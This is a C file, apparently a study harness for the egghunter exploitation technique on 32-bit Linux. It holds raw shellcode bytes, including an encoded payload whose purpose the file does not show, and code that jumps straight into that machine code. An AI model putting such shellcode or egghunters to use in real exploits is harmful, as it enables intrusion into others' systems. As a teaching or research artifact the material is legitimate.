#include <stdio.h>
#include <string.h>

unsigned char shellcode[] = \
/* put your egg here twice */
"\x90\x50\x90\x50"
"\x90\x50\x90\x50"
/* payload here */
//"\xeb\x16\x59\x31\xc0\x50\xb0\x04\x31\xdb\xb3\x01\x31\xd2\xb2\x0c\xcd\x80\x31\xc0\xb0\x01\xcd\x80\xe8\xe5\xff\xff\xff\x48\x65\x6c\x6c\x6f\x20\x45\x67\x67\x21\x21\x5c\x6e\x0a";
"\xbf\xf9\x58\x23\x84\xdb\xce\xd9\x74\x24\xf4\x58\x31\xc9\xb1"
"\x14\x31\x78\x14\x83\xc0\x04\x03\x78\x10\x1b\xad\x12\x5f\x2c"
"\xad\x06\x1c\x81\x58\xab\x2b\xc4\x2d\xcd\xe6\x86\x15\x4c\xab"
"\xee\xab\x70\x40\x56\xc1\x60\x07\xf6\x9f\x60\xcd\x90\xc7\xaf"
"\x92\xd5\xb9\x2b\x20\xe1\x89\x52\x8b\x69\xaa\x2a\x75\xa4\xad"
"\xd8\x23\x5c\x91\x86\x1e\x20\xa4\x4f\x59\x48\x18\x9f\xea\xe0"
"\x0e\xf0\x6e\x99\xa0\x87\x8c\x09\x6e\x11\xb3\x19\x9b\xec\xb4";

unsigned char egghunter[] = \
//"\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";
"\x31\xc9\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x90\x50\x90\x50\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7";

main()
{

	printf("Shellcode Length:  %d\n", strlen(shellcode));
        printf("Egghunter Length:  %d\n", strlen(egghunter));

	int (*ret)() = (int(*)())egghunter;

	ret();

}
 
